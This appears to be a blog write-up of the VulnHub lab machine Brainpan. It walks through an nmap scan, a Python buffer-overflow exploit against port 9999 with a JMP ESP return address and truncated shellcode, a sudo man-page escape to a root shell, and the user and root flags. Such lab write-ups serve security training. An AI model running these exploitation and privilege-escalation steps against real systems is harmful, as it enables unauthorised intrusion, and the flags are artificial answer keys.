---
title: "Brainpan - VulnHub"
description: "Writeup for Brainpan, a VulnHub machine focused on Buffer Overflow and binary exploitation."
pubDate: 2024-10-20
platform: "vulnhub"
category: "machines"
difficulty: "medium"
os: "linux"
language: en
tags: ["buffer-overflow", "binary-exploitation", "ret2libc"]
retired: false
heroImage: "/images/writeups/vulnhub/brainpan-card.png"
---

# Brainpan - VulnHub Writeup

**Difficulty**: Medium  
**OS**: Linux  
**Platform**: VulnHub

## Reconnaissance

Starting with an Nmap scan:

```bash
nmap -sC -sV -p- 192.168.1.100
```

**Open Ports:**
- 9999/tcp (Custom application)
- 10000/tcp (SimpleHTTPServer)

## Web Enumeration

Accessing port 10000, we find a web server with a simple web application.

## Buffer Overflow Analysis

We download the `brainpan.exe` binary from the web server and analyze it locally.

### Exploitation steps:

1. **Fuzzing** to find the offset
2. **EIP Control**
3. **Find JMP ESP**
4. **Shellcode generation**
5. **Exploitation**

```python
import socket

# Shellcode generated with msfvenom
shellcode = b"\x90" * 16 + b"..."

offset = 524
eip = b"\xf3\x12\x17\x31"  # JMP ESP

payload = b"A" * offset + eip + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 9999))
s.send(payload)
```

## Privilege Escalation

Once inside, we find that we can execute `anansi_util` as root.

```bash
sudo /home/anansi/bin/anansi_util manual man
!/bin/bash
```

Root shell!

## Flags

- **User Flag**: `a7d355b26bda6bf1196ccffead0b2cf2`
- **Root Flag**: `b6dd3d1d58fdb6f7e2e5f3b0f4b2e5c3`

## Conclusion

Excellent machine for practicing Buffer Overflow on Linux. Highly recommended for OSCP preparation.
